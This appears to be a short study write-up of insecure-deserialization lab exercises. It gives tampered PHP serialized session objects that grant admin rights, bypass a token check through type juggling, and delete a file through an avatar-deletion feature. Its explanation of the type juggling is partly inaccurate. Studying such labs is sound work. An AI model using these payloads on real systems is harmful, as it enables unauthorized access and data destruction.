### Modifying serialized objects

**Payload** :
Login as wiener -> decode Base64 the session cookie -> change value admin from 0 to 1 -> encode Base64 -> store encoded session to cookies
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`

### Modifying serialized data types

**Payload** :
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

**Penjelasan** :
Same as before, but since PHP version used is 7.x, so it could bring to PHP juggling, example. 
```php
if ($user->access_token == $stored_token) {
// Grant access 
}
```
If `$stored_token` is a non-numeric string, PHP will convert the integer `0` to a string and compare it to `$stored_token`. Due to PHP's type juggling rules, `0 == "any_non_numeric_string"` evaluates to `true`

### Using application functionality to exploit insecure deserialization

**Objection** : delete file morale.txt from Carlos's home directory
**Payload** : 
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mym70vmn02mt5jhee3g1aii0efwqergc";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
**Penjelasan** : 
Since the objection is to delete file, so it can achieve by abuse user-accessible functionality, such as delete user. On delete method it would be delete user and their avatar picture, because of that we have to change the value of avatar_link to desired file.

